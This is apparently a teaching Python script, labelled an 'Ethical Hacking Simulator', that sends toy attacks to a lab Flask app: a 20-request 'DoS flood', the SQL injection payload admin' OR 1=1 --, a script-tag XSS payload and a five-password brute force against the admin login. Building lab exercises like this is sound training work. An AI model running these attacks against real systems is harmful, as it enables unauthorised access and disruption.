import requests
import time
import sys

# --- CONFIGURATION ---
# REPLACE '127.0.0.1' with your Windows Victim IP (e.g., '192.168.1.105')
VICTIM_IP = '127.0.0.1' 
PORT = 5000
BASE_URL = f'http://{VICTIM_IP}:{PORT}'

def print_banner():
    print("""
    ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗
    ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║
    █████╗     ██║   ███████║██║██║     ███████║██║
    ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║
    ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗
    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
    Ethical Hacking Simulator - Remote Attack Script
    """)
    print(f"[*] Target Message: {BASE_URL}")

def check_connection():
    try:
        print(f"[*] Checking connection to {VICTIM_IP}...")
        requests.get(BASE_URL, timeout=2)
        print("[+] Connection Successful!")
        return True
    except requests.exceptions.ConnectionError:
        print("[-] Connection Failed. Ensure:")
        print("    1. The Flask App is running on the Victim Machine.")
        print("    2. You updated VICTIM_IP in this script.")
        print("    3. Both machines are on the same network.")
        return False

def attack_dos():
    print("\n[!] Launching DoS Flood (20 requests)...")
    for i in range(20):
        try:
            requests.get(BASE_URL)
            print(f"    Sent packet {i+1}/20")
        except:
            pass
    print("[+] DoS Attack Complete.")

def attack_sqli():
    print("\n[!] Launching SQL Injection...")
    payload = "admin' OR 1=1 --"
    url = f"{BASE_URL}/login"
    try:
        requests.post(url, json={'username': payload, 'password': 'x'})
        print(f"    [POST] {url} Payload: {payload}")
        print("[+] SQLi Attack Complete.")
    except Exception as e:
        print(f"[-] Failed: {e}")

def attack_xss():
    print("\n[!] Launching XSS Attack...")
    payload = "<script>alert('Pwned')</script>"
    url = f"{BASE_URL}/search"
    try:
        requests.get(url, params={'q': payload})
        print(f"    [GET] {url} Payload: {payload}")
        print("[+] XSS Attack Complete.")
    except Exception as e:
        print(f"[-] Failed: {e}")

def attack_brute_force():
    print("\n[!] Launching Brute Force (5 attempts)...")
    url = f"{BASE_URL}/login"
    passwords = ['123456', 'password', 'admin', 'qwerty', 'secret']
    for pwd in passwords:
        try:
            requests.post(url, json={'username': 'admin', 'password': pwd})
            print(f"    [POST] Failed login: admin:{pwd}")
        except:
            pass
    print("[+] Brute Force Complete.")

def main():
    print_banner()
    if not check_connection():
        sys.exit(1)

    while True:
        print("\nSELECT ATTACK TYPE:")
        print("1. DoS Flood")
        print("2. SQL Injection")
        print("3. XSS Exploit")
        print("4. Brute Force")
        print("5. Run All")
        print("Q. Quit")
        
        choice = input("\nSelection > ").upper()
        
        if choice == '1': attack_dos()
        elif choice == '2': attack_sqli()
        elif choice == '3': attack_xss()
        elif choice == '4': attack_brute_force()
        elif choice == '5':
            attack_dos()
            attack_sqli()
            attack_xss()
            attack_brute_force()
        elif choice == 'Q':
            break
        else:
            print("Invalid selection.")

if __name__ == "__main__":
    main()
